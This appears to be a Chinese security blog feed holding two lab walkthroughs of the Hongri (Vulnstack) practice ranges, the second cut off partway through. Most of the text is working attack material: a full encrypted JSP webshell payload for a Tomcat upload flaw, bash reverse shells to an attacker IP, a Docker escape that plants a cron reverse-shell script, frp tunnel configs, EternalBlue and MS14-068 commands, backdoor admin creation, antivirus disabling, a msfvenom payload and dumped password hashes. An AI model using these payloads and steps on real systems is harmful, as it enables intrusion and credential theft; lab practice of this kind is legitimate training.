        <content type="html"><![CDATA[<h1 id="红日靶场4"><a href="#红日靶场4" class="headerlink" title="红日靶场4"></a>红日靶场4</h1><h2 id="靶场配置"><a href="#靶场配置" class="headerlink" title="靶场配置"></a>靶场配置</h2><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105163649-sck4l3o.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105163545-lyeze8d.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105163605-7mlfpgw.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105163626-kmdn70v.png" alt="image">​</p><p>IP地址分配：</p><pre class=" language-xml"><code class="language-xml">Win7:192.168.183.133(内网)Ubuntu:192.168.183.134(内网)192.168.120.137(外网)DC:192.168.183.130(内网)Kali：192.168.120.128(外网)</code></pre><p>‍</p><p>ubuntu上可以启动一下docker</p><pre><code>docker start ec 17 09 bb da 3d ab ad</code></pre><p>拓扑如下：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105175525-810lj0p.png" alt="image">​​​</p><h2 id="打点×3"><a href="#打点×3" class="headerlink" title="打点×3"></a>打点×3</h2><p>拿fscan都能扫出来，然后拿工具直接打就行了</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095640-rt6w6c5.png" alt="image">​</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>这个就利用最简单的写木马即可了</p><p><a href="https://github.com/einzbernnn/Tomcatscan">einzbernnn&#x2F;Tomcatscan: Tomcat漏洞批量检测工具 (github.com)</a></p><p>然后修改poc&#x2F;cve_2017_12615.py里面的body成冰蝎就可以了：</p><pre class=" language-xml"><code class="language-xml">body = '''&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%!class</span> <span class="token attr-name">U</span> <span class="token attr-name">extends</span> <span class="token attr-name">ClassLoader{U(ClassLoader</span> <span class="token attr-name">c){super(c);}public</span> <span class="token attr-name">Class</span> <span class="token attr-name">g(byte</span> <span class="token attr-name">[]b){return</span> <span class="token attr-name">super.defineClass(b,0,b.length);}}%</span><span class="token punctuation">></span></span>&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095000-9s823ga.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102094750-18mwwuw.png" alt="image">​</p><p>拿着这个jsp地址直接连接就可以了</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102094742-l5doh8n.png" alt="image">​</p><h3 id="Struct2"><a href="#Struct2" class="headerlink" title="Struct2"></a>Struct2</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095806-ww71g3a.png" alt="image">​</p><p>也可以直接弹<code>shell</code>​-&gt;<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.120.1/4444 0&gt;&amp;1&quot;</code>​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095925-tikvxko.png" alt="image">​</p><h3 id="phpMyadmin"><a href="#phpMyadmin" class="headerlink" title="phpMyadmin"></a>phpMyadmin</h3><p>版本是4.8.1：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095330-wq48ol1.png" alt="image">​</p><p>有个任意文件读取的洞</p><p>  要利用的话首先要把利用的php语句执行一下查询，让他记录在session中</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102103039-2msdzcn.png" alt="image">​</p><p>再利用包含读取session文件即可，<code>/index.php?target=db_sql.php%253f/../../../../../../tmp/sess_a4d1a8108774d843aef5e34e7043568a</code>​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102102954-iizdf1n.png" alt="image">​</p><p>这里是可以执行phpinfo的，但是无法执行system或者其他getshell语句，挺奇怪的</p><p>三个点都是docker搭建的，所以就是看哪个点可以执行docker逃逸</p><h2 id="Docker逃逸"><a href="#Docker逃逸" class="headerlink" title="Docker逃逸"></a>Docker逃逸</h2><p>经过CDK检测，只有Tomcat的那个点可以进行docker逃逸</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102103343-w7fo19j.png" alt="image">​</p><p>但是这里只能对文件进行操作</p><p>所以我们就写计划任务了，这里好像是远程机器的ssh开启Public那个选项，可以写公钥，这里还是利用计划任务演示吧</p><p>fdisk -l看一下可挂载的磁盘</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102123916-fh80iww.png" alt="image">​</p><p>mkdir &#x2F;qingfeng 以qingfeng文件夹作为挂载的文件夹</p><p>&#x2F;qingfing: mount &#x2F;dev&#x2F;sda1 &#x2F;qingfeng</p><p>写反弹shell脚本</p><pre class=" language-xml"><code class="language-xml">echo '#!/bin/bash' > /qingfeng/tmp/qingfeng.shecho "/bin/bash -i >&amp; bash -i >&amp; /dev/tcp/192.168.120.1/9090 0>&amp;1"  >> /qingfeng/tmp/qingfeng.sh</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102124827-q0qkzfg.png" alt="image">​</p><p>再写个计划任务：</p><pre class=" language-xml"><code class="language-xml">sed -i '$a*/2 *   * * *   root  bash /tmp/qingfeng.sh ' /test/etc/crontabcat /qingfeng/etc/crontab</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102151756-ih6j9uz.png" alt="image">​​</p><p>之后监听9090等两分钟即可吃到shell</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102124935-z9hgc26.png" alt="image">​</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>首先就是直接上fscan开扫了,先看一下网段</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105143501-kuu5eek.png" alt="image">​</p><p>能扫到两个ms17010，但是只有win7的能够打通</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105143615-i5f9303.png" alt="image">​</p><p>接下来就是配置代理去打ms17010了</p><h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><p>上传frpc以及frpc.ini到攻破的web服务器下</p><p>frpc.ini的配置如下：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr = 192.168.120.1server_port = 7000token = frpToken@admin2022<span class="token punctuation">[</span>proxy<span class="token punctuation">]</span>type = tcpplugin = socks5remote_port = 25599</code></pre><p>接下来就是开启frps了，frps.ini的配置如下：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">[</span>common<span class="token punctuation">]</span><span class="token comment" spellcheck="true">## 一、服务器的基本配置部分</span><span class="token comment" spellcheck="true">## 7000 是FRP服务端口，可以改</span>bind_port = 7000<span class="token comment" spellcheck="true">## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。</span>dashboard_user = admindashboard_pwd = frpadmin@2022<span class="token comment" spellcheck="true">## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆</span>dashboard_port = 25500<span class="token comment" spellcheck="true">## 服务器和客户机之间的心跳连接</span>heartbeat_timeout = 30<span class="token comment" spellcheck="true">#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求</span>token=frpToken@admin2022</code></pre><p>先在本机运行<code>./frps -c frps.ini</code>​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105144054-tjw1pfy.png" alt="image">​</p><p>再在web服务器运行<code>./frpc -c frpc.ini</code>​即可</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105144111-5zq95pm.png" alt="image">​</p><p>当出现listen port以及success说明连接成功</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105144129-h1wma56.png" alt="image">​</p><h3 id="kali打ms17010"><a href="#kali打ms17010" class="headerlink" title="kali打ms17010"></a>kali打ms17010</h3><p>启动msf：<code>msfconsole</code>​</p><p>因为这里就挂了一个端口代理，所以用正向的攻击方式简单点，不然还得再配置一个代理</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue #使用ms17010模块set payload windows/x64/meterpreter/bind_tcp #设置正向连接set rhosts 192.168.183.133 # 设置win7的ip地址为目标地址</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105144950-1vhrc93.png" alt="image">​</p><p>配置好直接run即可：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105150723-ft632d7.png" alt="image">​​</p><p>所以下一步的目标就是攻破域控了</p><h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><p>为了方便我这里直接添加用户上桌面了：</p><pre class=" language-shell"><code class="language-shell">net user qingfeng qwer1234! /addnet localgroup administrators qingfeng /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p>配置都是老掉牙了，不熟悉可以看看前面的红日打靶：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105152016-ka68ome.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105152053-rnkm758.png" alt="image">​</p><p>上桌面后传一个mimikatz抓密码，你也可以直接使用msf的kiwi</p><pre class=" language-xml"><code class="language-xml">meterpreter > kiwi_cmd sekurlsa::logonpasswordsAuthentication Id : 0 ; 444103 (00000000:0006c6c7)Session           : Interactive from 1User Name         : douserDomain            : DEMOLogon Server      : WIN-ENS2VR5TR3NLogon Time        : 2023/12/27 21:10:03SID               : S-1-5-21-979886063-1111900045-1414766810-1107        msv :         [00010000] CredentialKeys         * NTLM     : bc23b0b4d5bf5ff42bc61fb62e13886e         * SHA1     : c48096437367aad00ac2dc70552051cd84912a55         [00000003] Primary         * Username : douser         * Domain   : DEMO         * NTLM     : bc23b0b4d5bf5ff42bc61fb62e13886e         * SHA1     : c48096437367aad00ac2dc70552051cd84912a55        tspkg :        wdigest :         * Username : douser         * Domain   : DEMO         * Password : Dotest123        kerberos :         * Username : douser         * Domain   : DEMO.COM         * Password : (null)        ssp :        credman :</code></pre><p>这里抓到了用户的SID，可以尝试使用MS14-068打一下了，如果域控没装KB3011780的话就可以拿下</p><hr><p>需要用到的工具下载地址：</p><pre class=" language-xml"><code class="language-xml">Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exemimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases</code></pre><hr><p>首先需要生成票据：</p><pre class=" language-xml"><code class="language-xml">MS14-068.exe -u douser@DEMO.COM -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105152502-zwowee1.png" alt="image">​</p><p>桌面会生成一个票据</p><p>下一步利用mimikatz.exe(记得管理员权限)将证书写入，可以提升为域管理员：</p><pre class=" language-cmd"><code class="language-cmd">kerberos::ptc TGT_douser@DEMO.COM.ccache</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105160810-xx1658u.png" alt="image">​</p><p>接着使用PsExec64横向：</p><pre class=" language-cmd"><code class="language-cmd">PsExec64.exe \\WIN-ENS2VR5TR3N cmd.exe</code></pre><p>这个计算机名字是fscan的时候扫出来的：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105152706-een39ep.png" alt="image">​</p><p>然后运行即可拿到域控的shell：</p><p>使用ipconfig命令可以看到已经是域控的IP了</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20231228131511-4yqh03y.png" alt="image">​</p><h3 id="域控上线"><a href="#域控上线" class="headerlink" title="域控上线"></a>域控上线</h3><p>其实到这也算打靶结束，但是这里给自己下一个题，如何再上线呢？</p><p>我这里的思路就是通过certutil命令下载木马到域控，再通过一层端口转发到我们的kali，把木马流量转发到我们的kali即可上线成功</p><p>‍</p><p>首先在ubuntu上写入frps.msf文件：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>bind_port = 7001token=frpToken@admin2022</code></pre><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105154011-bjywzjg.png" alt="image">​</p><p>接着配置kali使用frpc.msf:</p><pre class=" language-yaml"><code class="language-yaml"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>server_addr = 192.168.120.137 <span class="token comment" spellcheck="true"># ubuntu的外网地址</span>server_port = 7001token = frpToken@admin2022<span class="token punctuation">[</span>proxy<span class="token punctuation">]</span>type = tcplocal_ip = 192.168.120.128 <span class="token comment" spellcheck="true"># kali地址</span>local_port = 9999remote_port = 9999</code></pre><p>若是这样跑起来则是把192.168.120.137的9999端口流量转发到kali的9999端口</p><p>所以生成木马也是选择ubuntu的地址作为木马地址：</p><pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.183.134 LPORT=9999 -f exe > dc.exe</code></pre><p>192.168.183.134是ubuntu的内网地址</p><p>msf监听等待回连</p><pre class=" language-shell"><code class="language-shell">use exploit/multi/handlerset lport 9999set lhost 192.168.120.128set payload windows/x64/meterpreter/reverse_tcp</code></pre><p>然后通过win7让dc下载木马程序:</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105155825-jjy3d8y.png" alt="image">​</p><p>这里的web服务你可以使用HFS也可以直接跑python，只要能让域控访问到就行</p><p>其实这里可以直接放到ubuntu的web目录下直接让dc访问也可以，当时做的时候传HFS方便点</p><p>下载完后运行dc.exe即可上线MSF</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105155217-67ovbij.png" alt="image">​</p><p>跑个ipconfig证明一手：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240105160029-nk9vhxe.png" alt="image">​</p><p>至此红日4成功完成</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场2</title>
      <link href="/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/"/>
      <url>/2023/12/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/</url>
      
        <content type="html"><![CDATA[<h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h1><h2 id="靶场配置"><a href="#靶场配置" class="headerlink" title="靶场配置"></a>靶场配置</h2><h3 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h3><ul><li>红日靶场一下载地址 :<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></li><li>靶机通用密码：administrator&#x2F;1qaz@WSX</li></ul><h3 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203752-xb5jeh8.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203809-q43c5e4.png" alt="image">​</p><p>网卡配置就是这样</p><p>PC和WEb都配两张（NAT和VMnet2），防火墙也懒得搞了，因为PC这台根本不让访问，防火墙得手动去关掉才行，但是也打不下来。</p><h3 id="最重要的配置"><a href="#最重要的配置" class="headerlink" title="最重要的配置"></a>最重要的配置</h3><p><strong>WEB配置</strong></p><p>目录<code>C:\Oracle\Middleware\user_projects\domains\base_domain</code>​，以管理员身份运行运行<code>statweblogic</code>​服务</p><h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231218203642-nj5tctc.png" alt="image">​</p><p>‍</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里直接用fscan进行信息收集了</p><pre class=" language-xml"><code class="language-xml">┌──(root㉿kali)-[/home/kali/Desktop/Tools]└─# ./fscan_amd64 -h 192.168.111.80 -np   ___                              _    / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;  \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.2start infoscan192.168.111.80:7001 open192.168.111.80:1433 open192.168.111.80:135 open192.168.111.80:445 open192.168.111.80:139 open192.168.111.80:80 open[*] alive ports len is: 6start vulscan[*] WebTitle: http://192.168.111.80     code:200 len:0      title:None[+] 192.168.111.80      MS17-010        (Windows Server 2008 R2 Standard 7601 Service Pack 1)[*] WebTitle: http://192.168.111.80:7001 code:404 len:1164   title:Error 404--Not Found[+] InfoScan:http://192.168.111.80:7001 [weblogic] 已完成 6/6[*] 扫描结束,耗时: 11.134261019s</code></pre><p>发现又是ms17010？</p><p>打打看</p><p><code>auxiliary/admin/smb/ms17_010_command</code>​模块：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161141-i6kzd2n.png" alt="image">​</p><p><code>exploit/windows/smb/ms17_010_eternalblue</code>​模块：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161058-iaj5arh.png" alt="image">​</p><p>发现没打通，那这里就用<code>weblogic</code>​的洞去打打看</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>工具直接打通了：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161625-vx2zxtl.png" alt="image">​</p><p>连接哥斯拉：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161634-4ha8g60.png" alt="image">​</p><p>现在就尝试上线CS，准备横向</p><p>上线CS之前我们看看有没有杀软：<code>tasklist /svc</code>​</p><p><a href="https://www.ddosi.org/av/1.php">Windows杀软在线查询 (ddosi.org)</a> </p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212161735-s8giwgx.png" alt="image">​</p><p>发现有一个360，所以我们这里得要尝试关闭360</p><p>第一思路是看他启动权限，发现他乱码了</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162136-xe51w6n.png" alt="image">​</p><p>那就直接kill，但是失败了，所以这里我就打算上桌面去关闭了</p><p>我们新建帐号：</p><pre class=" language-xml"><code class="language-xml">net user qingfeng qwer1234! /addnet localgroup administrators qingfeng /addREG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p>发现添加成功</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162337-rjv4txn.png" alt="image">​</p><p>但是这里由于又防火墙的原因，所以我们只能挂代理进去接管</p><p>上传frpc到Web系统</p><p>本地起一个frps</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162551-r29m30y.png" alt="image">​</p><p>然后Web系统执行frpc.exe -c frpc.ini连接</p><p>配置文件如下：</p><p>frps.ini</p><pre class=" language-xml"><code class="language-xml">[common]## 一、服务器的基本配置部分## 7000 是FRP服务端口，可以改bind_port = 7000## dashboard_user和dashboard_pwd是FRP网页版管理员用户名密码，可以改。dashboard_user = admindashboard_pwd = frpadmin@2022## 7500 是网页版管理端口：可以通过 http://服务器ip:7500登陆dashboard_port = 25500## 服务器和客户机之间的心跳连接heartbeat_timeout = 30#token设置，需要和客户端一致，客户端与服务端通过token进行认证，建议满足复杂度要求token=frpToken@admin2022</code></pre><p>frpc.ini</p><pre class=" language-xml"><code class="language-xml">[common]server_addr = 192.168.111.1server_port = 7000token = frpToken@admin2022[proxy]type = tcpplugin = socks5remote_port = 25599</code></pre><p>proxifier挂上mstsc代理</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162916-n5lh5w4.png" alt="image">​<img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231211194800-1r6iydb.png" alt="image">​</p><p>远程连接：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212162939-gtzivwx.png" alt="image">​</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163028-r1uvrym.png" alt="image">​</p><p>关闭之后就可以愉快的上线了，当然你这里有360免杀的话可以选择跳过这一步</p><p>上传木马上线：</p><p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/image-20231212163512-mel0yjy.png" alt="image">​</p><h2 id="hash传递-内网横向"><a href="#hash传递-内网横向" class="headerlink" title="hash传递-内网横向"></a>hash传递-内网横向</h2><p>上线之后就是考虑如何横向了</p><p>主要思路就是两个：</p><p>1.打服务</p><p>2.抓密码</p><h3 id="横向信息探测"><a href="#横向信息探测" class="headerlink" title="横向信息探测"></a>横向信息探测</h3><p>先上fscan探测一下其他存活主机：</p><pre class=" language-xml"><code class="language-xml">[12/15 10:08:46] [*] Tasked beacon to run: fscan.exe -h 10.10.10.10/24 -o out.txt[12/15 10:08:46] [+] host called home, sent: 68 bytes[12/15 10:08:56] [+] received output:   ___                              _    / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| '__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;  \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.7.1start infoscan(icmp) Target 10.10.10.10     is alive(icmp) Target 10.10.10.129    is alive(icmp) Target 10.10.10.128    is alive[*] Icmp alive hosts len is: 310.10.10.10:445 open10.10.10.128:139 open10.10.10.10:88 open10.10.10.129:7001 open10.10.10.129:1433 open10.10.10.128:445 open10.10.10.129:445 open10.10.10.129:139 open10.10.10.128:135 open10.10.10.129:135 open10.10.10.10:135 open10.10.10.129:80 open10.10.10.10:139 open[*] alive ports len is: 13[*] start vulscan[+] NetInfo:[*]10.10.10.129   [->]WEB   [->]192.168.120.132   [->]10.10.10.129[+] 10.10.10.129MS17-010(Windows Server 2008 R2 Standard 7601 Service Pack 1)[*] 10.10.10.129         DE1AY\WEB               Windows Server 2008 R2 Standard 7601 Service Pack 1[+] NetInfo:[*]10.10.10.10   [->]DC   [->]10.10.10.10[+] 10.10.10.10MS17-010(Windows Server 2012 R2 Standard 9600)[+] 10.10.10.128MS17-010(Windows 7 Ultimate 7601 Service Pack 1)[*] 10.10.10.10    [+]DC DE1AY\DC                Windows Server 2012 R2 Standard 9600[*] 10.10.10.128         __MSBROWSE__\PC                Windows 7 Ultimate 7601 Service Pack 1[*] WebTitle:http://10.10.10.129       code:200 len:0      title:None[12/15 10:08:59] [+] received output:[*] WebTitle:http://10.10.10.129:7001  code:404 len:1164   title:Error 404--Not Found[+] InfoScan:http://10.10.10.129:7001  [weblogic] [12/15 10:09:00] [+] received output:[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2729-2 [+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2017-10271 echo[+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2020-14750 [+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2729-1 [+] http://10.10.10.129:7001 poc-yaml-weblogic-cve-2019-2725 v10</code></pre><p>没有可利用的服务，所以现在先尝试抓密码利用smbexe之类的进行横向</p><p>抓密码可以看到很多结果：</p><pre class=" language-xml"><code class="language-xml">[12/15 09:00:48] qf beacon> logonpasswords[12/15 09:00:48] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command[12/15 09:00:49] [+] host called home, sent: 313675 bytes[12/15 09:00:49] [+] received output:Authentication Id : 0 ; 2701098 (00000000:0029372a)Session           : RemoteInteractive from 2User Name         : qingfengDomain            : WEBLogon Server      : WEBLogon Time        : 2023/12/12 16:29:39SID               : S-1-5-21-3767205380-3469466069-2137393323-1007    msv :     [00000003] Primary     * Username : qingfeng     * Domain   : WEB     * LM       : 1319b0fa23c89f2d7e51f0bf38bde884     * NTLM     : 6912928308e3cda903e6d75bd6091a20     * SHA1     : 4687d6f9b23b55f21825bc5157fe2cbe707c07de    tspkg :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    wdigest :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    kerberos :     * Username : qingfeng     * Domain   : WEB     * Password : qwer1234!    ssp :    credman :Authentication Id : 0 ; 138374 (00000000:00021c86)Session           : Service from 0User Name         : mssqlDomain            : DE1AYLogon Server      : DCLogon Time        : 2023/12/12 15:57:57SID               : S-1-5-21-2756371121-2868759905-3853650604-2103    msv :     [00000003] Primary     * Username : mssql     * Domain   : DE1AY     * LM       : f67ce55ac831223dc187b8085fe1d9df     * NTLM     : 161cff084477fe596a5db81874498a24     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d    tspkg :     * Username : mssql     * Domain   : DE1AY     * Password : 1qaz@WSX    wdigest :     * Username : mssql     * Domain   : DE1AY     * Password : 1qaz@WSX    kerberos :     * Username : mssql     * Domain   : DE1AY.COM     * Password : 1qaz@WSX    ssp :    credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WEB$Domain            : DE1AYLogon Server      : (null)Logon Time        : 2023/12/12 15:57:56SID               : S-1-5-20    msv :     [00000003] Primary     * Username : WEB$     * Domain   : DE1AY     * NTLM     : 124f918941c21f51bfe68f4e2a59b2fc     * SHA1     : 5c04dc8560a5c060d61b5b66ce973837be30a524    tspkg :    wdigest :     * Username : WEB$     * Domain   : DE1AY     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 ab ed a9 1e 54 cc 1a 36 49 e4 62 53 a1 87 29 cc ee e7 62 33 65 6f 1b 05 bc 9a 11 5a ad a9 2b 18 35 1d 29 94 22 f8 87 84 20 f0 39 99 8d 15 bb 6e d5 fe 22 aa f2 44 b3 91 43 68 5e ee f6 f6 55 a9 25 1d 7c 17 3f 1e 09 28 cc 41 52 ea c5 29 a8 d7 13 f3 15 de ed 1a 13 1b a8 91 b5 fb a1 1f 27 24 a5 80 58 4f 62 54 f4 ef 94 86 ea 41 36 d6 a3 89 87 61 a2 de de 9b ac 52 ed     kerberos :     * Username : web$     * Domain   : DE1AY.COM     * Password : a6 11 f4 bb c7 69 8e 43 cb 12 d0 8e 40 1d e5 71 0e 3a 24 27 79 79 3b 66 b1 85 c8 d4 3b 19 0d 25 34 75 87 d7 79 d9 44 fd 28 da 61 26 36 3c 34 32 f5 05 fb 65 fc 15 cc 35 7c 77 1f 27 4a 0d 22 8c 59 89 9d 9a 5d 3c d7 5b 1c 80 97 a0 a8 c5 b5 db 93 c6 16 e4 ca 18 a9 f9 1f 84 1d 73 2b 7d 33 c8 22 cb 30 ec 94 02 69 ec ee 6c 29 8a 2e 98 29 9a 5c 30 e2 e2 96 49 f1 